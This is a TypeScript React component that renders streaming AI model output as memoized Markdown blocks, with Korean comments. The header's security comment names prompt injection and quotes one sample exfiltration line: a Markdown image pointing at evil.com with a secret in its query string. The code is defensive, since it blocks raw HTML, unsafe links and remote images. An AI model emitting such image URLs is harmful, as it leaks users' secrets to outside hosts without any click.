import { marked } from 'marked'
import { memo, useMemo, type ComponentProps } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import type { PluggableList } from 'unified'
import remarkGfm from 'remark-gfm'
import { repairMarkdownTail } from './repairMarkdown'

/**
 * 스트리밍 Markdown
 *
 * 문제: react-markdown은 받은 텍스트 전체를 매번 파싱한다. 토큰이 올 때마다 전체를 다시 파싱하면
 *       메시지 길이 × 토큰 수 = O(n²). 긴 답변 후반부로 갈수록 프레임이 떨어진다.
 * 해결: 텍스트를 최상위 블록(문단, 리스트, 코드 블록…) 단위로 쪼개고, 블록마다 memo한다.
 *       완성된 블록은 문자열이 그대로라 다시 파싱되지 않고, 바뀌는 건 마지막 블록 하나뿐이다.
 *       (블록 분할 자체는 marked.lexer로 O(n)이지만 react-markdown 파싱+렌더보다 훨씬 싸다)
 *
 * 보안: 모델 출력은 신뢰할 수 없는 입력이다(프롬프트 인젝션).
 *   - raw HTML을 렌더링하지 않는다 (rehype-raw 미사용).
 *   - 링크는 http(s)/mailto만 허용한다. javascript: 등은 제거된다.
 *   - 원격 이미지는 불러오지 않는다. `![](https://evil.com/?q=<비밀>)` 한 줄이면
 *     클릭 없이도 데이터가 외부로 나간다. 이미지는 링크로만 보여준다.
 */

function splitBlocks(text: string): string[] {
  try {
    return marked.lexer(text).map((t) => t.raw)
  } catch {
    return [text]
  }
}

const safeUrl = (url: string) => (/^(https?:|mailto:|#)/i.test(url.trim()) ? url : '')

function CodeBlock({ children }: ComponentProps<'pre'>) {
  const codeEl = (Array.isArray(children) ? children[0] : children) as { props?: { className?: string; children?: unknown } }
  const lang = /language-(\S+)/.exec(codeEl?.props?.className ?? '')?.[1] ?? 'text'
  const code = String(codeEl?.props?.children ?? '').replace(/\n$/, '')
  return (
    <div className="codeblock">
      <div className="codeblock-head">{lang}</div>
      {/* 하이라이팅은 하지 않는다: 스트리밍 중 토큰마다 재하이라이팅하면 깜빡이고 비싸다(streamdown#402).
          같은 폰트/패딩의 plain 코드로 그려 레이아웃이 흔들리지 않게 한다. */}
      <pre>
        <code>{code}</code>
      </pre>
    </div>
  )
}

// 모듈 상수: 렌더마다 새 객체를 만들면 memo된 블록의 props가 매번 바뀐다.
const COMPONENTS: Components = {
  pre: CodeBlock,
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer nofollow">
      {children}
    </a>
  ),
  img: ({ src, alt }) =>
    typeof src === 'string' && src ? (
      <a href={src} target="_blank" rel="noopener noreferrer nofollow" className="img-link">
        🖼 {alt || '이미지 링크'}
      </a>
    ) : null,
  table: ({ children }) => (
    <div className="table-wrap">
      <table>{children}</table>
    </div>
  ),
}
// singleTilde: false — 한국어는 범위를 "17~23도"처럼 물결표 하나로 쓴다. GFM 기본값은 ~한 쌍을
// 취소선으로 해석해서, 범위가 두 번 나오는 문장("17~23도, 서울은 11~21도")에 줄이 그어진다.
const REMARK_PLUGINS: PluggableList = [[remarkGfm, { singleTilde: false }]]

const Block = memo(function Block({ source }: { source: string }) {
  return (
    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={COMPONENTS} urlTransform={safeUrl}>
      {source}
    </ReactMarkdown>
  )
})

export const StreamingMarkdown = memo(function StreamingMarkdown({ text, streaming }: { text: string; streaming: boolean }) {
  const blocks = useMemo(() => {
    const raw = splitBlocks(text)
    if (streaming && raw.length) raw[raw.length - 1] = repairMarkdownTail(raw[raw.length - 1])
    return raw
  }, [text, streaming])

  return (
    <div className="md">
      {blocks.map((b, i) => (
        // key=index가 여기서는 맞다: 블록은 뒤에만 추가되고, 앞 블록의 위치는 변하지 않는다.
        <Block key={i} source={b} />
      ))}
      {streaming && <span className="cursor" aria-hidden />}
    </div>
  )
})
